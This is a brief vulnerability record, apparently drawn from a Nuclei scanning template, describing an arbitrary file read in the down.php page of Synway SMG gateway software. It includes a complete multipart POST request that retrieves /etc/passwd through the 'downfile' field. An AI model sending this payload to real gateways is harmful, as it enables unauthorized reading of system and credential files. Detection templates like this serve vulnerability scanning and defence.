# Vulnerability: Synway SMG Gateway down.php - Arbitrary File Read
**Classification:** SANHUI-SMG
**Source:** Nuclei Template (`sanhui-smg-file-read.yaml`)

## Description
There is an arbitrary file reading vulnerability in the down.php file of Synway SMG gateway management software, through which an attacker can download any file from the server.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /down.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfA9vzLuw6Gmtnmv2

------WebKitFormBoundaryfA9vzLuw6Gmtnmv2
Content-Disposition: form-data; name="downfile"

/etc/passwd
------WebKitFormBoundaryfA9vzLuw6Gmtnmv2
Content-Disposition: form-data; name="down"

下载
------WebKitFormBoundaryfA9vzLuw6Gmtnmv2
Content-Disposition: form-data; name="runinfoupdate"

------WebKitFormBoundaryfA9vzLuw6Gmtnmv2--
```

